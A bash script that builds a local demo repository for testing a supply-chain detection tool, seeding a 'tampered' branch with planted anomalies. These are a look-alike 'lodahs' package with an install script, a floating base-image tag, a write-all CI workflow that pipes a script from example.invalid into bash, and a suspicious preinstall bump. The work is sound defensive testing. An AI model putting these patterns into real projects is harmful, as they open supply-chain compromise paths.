#!/usr/bin/env bash
# Builds the demo target repo for the Supply Chain Guardian.
#
#   target/            a git repo containing a real open-source app (snyk-labs/nodejs-goof)
#     branch baseline  the app as published, plus a credential-free smoke test and one
#                      vendored helper package (guardian-demo-strfmt@1.0.0, no scripts)
#     branch tampered  baseline + 4 harmless, local-only supply-chain anomalies (1 commit each)
#     branch tampered-integrity (optional)  tampered + a corrupted lockfile hash
#                      (static analysis only: `npm ci` fails there on purpose)
#
# Everything stays on this machine. Nothing is published to any registry.
# The seeded packages are inert: their install scripts only write a marker file in the
# OS temp directory. See demo/ground_truth.yaml for the full list of what is planted.
#
# Usage: scripts/make_demo_target.sh [--with-integrity-tamper] [--force]
set -euo pipefail

KIT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
TARGET="${GUARDIAN_TARGET_DIR:-$KIT_DIR/target}"
UPSTREAM="https://github.com/snyk-labs/nodejs-goof"
PIN="add14ba59e98240d9e00a235dd7d42cd61ae9912"   # upstream HEAD on 2026-05-01, Apache-2.0
LOCK_EDIT="$KIT_DIR/scripts/_lock_edit.py"
INTEGRITY_TAMPER=0; FORCE=0
for a in "$@"; do
  case "$a" in
    --with-integrity-tamper) INTEGRITY_TAMPER=1 ;;
    --force) FORCE=1 ;;
    *) echo "unknown arg: $a" >&2; exit 2 ;;
  esac
done

case "$TARGET" in
  ""|"/"|"$HOME"|"$KIT_DIR") echo "refusing to use '$TARGET' as the target directory" >&2; exit 2 ;;
esac
if [ -e "$TARGET" ] && [ "$FORCE" != 1 ]; then
  echo "$TARGET already exists (use --force to rebuild)"; exit 1
fi
for t in git npm python3; do
  command -v "$t" >/dev/null 2>&1 || { echo "missing prerequisite: $t" >&2; exit 2; }
done

# Build in a temporary directory and swap at the end, so a failed rebuild (no network,
# interrupted run) never destroys a working target.
FINAL_TARGET="$TARGET"
TARGET="$(mktemp -d "${FINAL_TARGET%/}.build.XXXXXX")"
trap 'rm -rf "${TARGET:?}"' EXIT

pack() {  # pack <package-dir>  -> tarball into $TARGET/vendor
  ( cd "$1" && npm pack --silent --pack-destination "$TARGET/vendor" >/dev/null )
}
add_require() {  # add_require <var> <module>  -> one extra require() line in routes/index.js
  python3 - "$1" "$2" <<'PY'
import sys
var, mod = sys.argv[1:3]
anchor = "var _ = require('lodash');"
s = open("routes/index.js").read()
assert anchor in s, "anchor line not found in routes/index.js"
s = s.replace(anchor, anchor + "\nvar %s = require('%s');" % (var, mod), 1)
open("routes/index.js", "w").write(s)
PY
}

git clone -q "$UPSTREAM" "$TARGET"
cd "$TARGET"
git checkout -q "$PIN"
git remote remove origin            # no remote at all: nothing can be pushed anywhere
git checkout -q -b baseline
git config user.name  "Guardian Demo"
git config user.email "guardian-demo@example.invalid"
git config commit.gpgsign false     # a global signing setup would otherwise abort the build
git config tag.gpgsign false
mkdir -p vendor guardian

# --- baseline prep 1: upstream `npm test` needs a Snyk token, so add a local smoke test ---
cat > guardian/compose.guardian.yml <<'COMPOSE'
# Compose file used by the Guardian smoke test instead of the upstream docker-compose.yml.
# Differences: binds only to 127.0.0.1 (the app is deliberately vulnerable; keep it off the
# network), publishes no debug or database port, and sets no fixed container names so two
# validations can run side by side under different project names.
services:
  goof:
    build:
      context: ..
    environment:
      - DOCKER=1
    ports:
      - "127.0.0.1:${GUARDIAN_APP_PORT:-3001}:3001"
    depends_on:
      - goof-mongo
  goof-mongo:
    image: mongo:3
COMPOSE
cat > guardian/smoke-test.sh <<'SMOKE'
#!/usr/bin/env bash
# Credential-free build + smoke test used by the Guardian's Validator.
# Exit 0 = app image builds, container starts, and the checked pages answer HTTP 200.
# NOTE: not run when the kit was written (no docker there). Phase 0 verifies and extends it.
set -euo pipefail
cd "$(dirname "$0")/.."
PROJECT="${GUARDIAN_COMPOSE_PROJECT:-guardian-smoke}"
export GUARDIAN_APP_PORT="${GUARDIAN_APP_PORT:-3001}"
COMPOSE=(docker compose -p "$PROJECT" -f guardian/compose.guardian.yml)
cleanup() { "${COMPOSE[@]}" down -v --remove-orphans >/dev/null 2>&1 || true; }
trap cleanup EXIT
for f in app.js routes/*.js; do node --check "$f"; done
"${COMPOSE[@]}" up -d --build
code=""
for i in $(seq 1 60); do
  code="$(curl -s -o /dev/null -w '%{http_code}' "http://127.0.0.1:${GUARDIAN_APP_PORT}/" || true)"
  if [ "$code" = "200" ]; then echo "SMOKE OK (HTTP 200 after ${i} tries)"; exit 0; fi
  sleep 2
done
echo "SMOKE FAILED: last HTTP code ${code:-none}" >&2
"${COMPOSE[@]}" logs --tail 40 goof >&2 || true
exit 1
SMOKE
chmod +x guardian/smoke-test.sh
python3 - <<'PY'
import json
p = json.load(open("package.json"))
p["scripts"]["test:upstream-snyk"] = p["scripts"].get("test", "")
p["scripts"]["test"] = "bash guardian/smoke-test.sh"
with open("package.json", "w") as f:
    json.dump(p, f, indent=2); f.write("\n")
PY
git add -A && git commit -q -m "chore: add credential-free smoke test for local validation"

# --- baseline prep 2: a vendored helper that is clean in this version --------------------
pack "$KIT_DIR/demo/packages/guardian-demo-strfmt/v1.0.0"
python3 "$LOCK_EDIT" guardian-demo-strfmt 1.0.0 vendor/guardian-demo-strfmt-1.0.0.tgz
add_require strfmt guardian-demo-strfmt
git add -A && git commit -q -m "chore: vendor string formatting helper"
git tag guardian-baseline

# --- tampered branch ---------------------------------------------------------------------
git checkout -q -b tampered

# (1) look-alike dependency with an install script, pulled from a local tarball
pack "$KIT_DIR/demo/packages/lodahs"
python3 "$LOCK_EDIT" lodahs 4.17.21 vendor/lodahs-4.17.21.tgz --install-script
add_require strutil lodahs
git add -A && git commit -q -m "feat: add string helper utility"

# (2) base image moved from an exact version to a floating tag (no digest). A floating major
#     tag is used rather than `latest` so the image still builds and can be pre-pulled.
python3 - <<'PY'
s = open("Dockerfile").read()
assert "FROM node:18.13.0" in s
open("Dockerfile", "w").write(s.replace("FROM node:18.13.0", "FROM node:18", 1))
PY
git add -A && git commit -q -m "chore: use node 18 base image"

# (3) third-party CI action on a mutable tag. tj-actions/changed-files is a real action
#     that was compromised in March 2025 (CVE-2025-30066). The workflow is never run.
cat > .github/workflows/changed-files.yml <<'YML'
name: "changed files"
on: [pull_request]
permissions: write-all
jobs:
  changed:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - uses: tj-actions/changed-files@v45
      - run: curl -sSL https://example.invalid/setup.sh | bash
YML
git add -A && git commit -q -m "ci: list changed files on pull requests"

# (4) suspicious update: the vendored helper gains a preinstall script and a large encoded
#     file in a patch release (the shape of the 2025-2026 npm worm droppers). Harmless.
pack "$KIT_DIR/demo/packages/guardian-demo-strfmt/v1.0.1"
git rm -q vendor/guardian-demo-strfmt-1.0.0.tgz
python3 "$LOCK_EDIT" guardian-demo-strfmt 1.0.1 vendor/guardian-demo-strfmt-1.0.1.tgz --install-script
git add -A && git commit -q -m "chore: bump guardian-demo-strfmt to 1.0.1"

# (5) optional: corrupt one lockfile integrity hash. This makes `npm ci` fail on purpose,
#     so it lives on its own branch and is detected statically (lockfile vs registry).
#     Keep every build-breaking seed off `tampered`, or Day 2 validation cannot run.
if [ "$INTEGRITY_TAMPER" = 1 ]; then
  git checkout -q -b tampered-integrity
  python3 - <<'PY'
import json
l = json.load(open("package-lock.json"))
e = l["packages"]["node_modules/lodash"]
e["integrity"] = "sha1-AAAAAAAAAAAAAAAAAAAAAAAAAAA="
if "dependencies" in l and "lodash" in l["dependencies"]:
    l["dependencies"]["lodash"]["integrity"] = e["integrity"]
with open("package-lock.json", "w") as f:
    json.dump(l, f, indent=2); f.write("\n")
PY
  git add -A && git commit -q -m "chore: refresh lockfile"
  git checkout -q tampered
fi

cd "$KIT_DIR"
if [ -e "$FINAL_TARGET" ]; then rm -rf "${FINAL_TARGET:?}"; fi
mv "$TARGET" "$FINAL_TARGET"
trap - EXIT
TARGET="$FINAL_TARGET"
cd "$TARGET"

echo
echo "Demo target ready at: $TARGET"
git --no-pager log --oneline guardian-baseline..tampered
echo "Branches:"; git --no-pager branch --list
